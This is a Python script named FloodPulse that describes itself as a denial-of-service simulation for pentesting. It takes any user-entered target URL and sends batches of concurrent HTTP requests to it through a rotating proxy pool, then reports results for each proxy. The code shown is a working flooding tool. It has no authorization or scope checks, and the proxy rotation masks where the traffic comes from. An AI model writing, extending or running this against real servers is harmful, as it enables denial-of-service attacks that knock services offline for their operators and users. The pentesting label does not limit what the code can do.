# floodpulse.py
"""
FloodPulse: A DoS simulation tool for pentesting server resilience.
"""

import asyncio
import time
import random
from aiohttp import ClientSession
from config import NUM_REQUESTS, CONCURRENT_USERS, TEST_DURATION
from proxy_manager import initialize_proxy_pool, ProxyPool
from request_handler import fetch

async def run_test(proxy_pool: ProxyPool, target_url: str):
    """Executes the FloodPulse DoS simulation."""
    async with ClientSession() as session:
        tasks = []
        start_time = time.time()
        end_time = start_time + TEST_DURATION

        for _ in range(NUM_REQUESTS):
            if time.time() >= end_time:
                break
            proxy = proxy_pool.choose()
            tasks.append(fetch(session, target_url, proxy_pool, proxy))
            if len(tasks) >= CONCURRENT_USERS:
                await asyncio.gather(*tasks)
                tasks = []
            await asyncio.sleep(random.uniform(0.1, 1.0))

        if tasks:
            await asyncio.gather(*tasks)

        elapsed = time.time() - start_time
        total_requests = sum(p["success"] + p["fail"] for p in proxy_pool.stats().values())
        print(f"FloodPulse test complete in {elapsed:.2f}s. Sent {total_requests} requests to {target_url}.")
        for proxy, stats in proxy_pool.stats().items():
            avg_latency = sum(stats["latency"]) / len(stats["latency"]) if stats["latency"] else float("inf")
            print(f"Proxy {proxy}: {stats['success']} successes, {stats['fail']} fails, avg latency {avg_latency:.2f}s")

async def main():
    """Initializes and runs FloodPulse with user-provided target URL."""
    print("Welcome to FloodPulse!")
    target_url = input("Enter the target URL (e.g., http://example.com:80): ").strip()
    # Default to HTTPS if :443 is specified, otherwise HTTP
    if ":443" in target_url and not target_url.startswith("http://") and not target_url.startswith("https://"):
        target_url = f"https://{target_url}"
    elif not target_url.startswith("http://") and not target_url.startswith("https://"):
        target_url = f"http://{target_url}"
    print(f"FloodPulse targeting: {target_url}")
    
    proxy_pool = await initialize_proxy_pool()
    await run_test(proxy_pool, target_url)

if __name__ == "__main__":
    asyncio.run(main())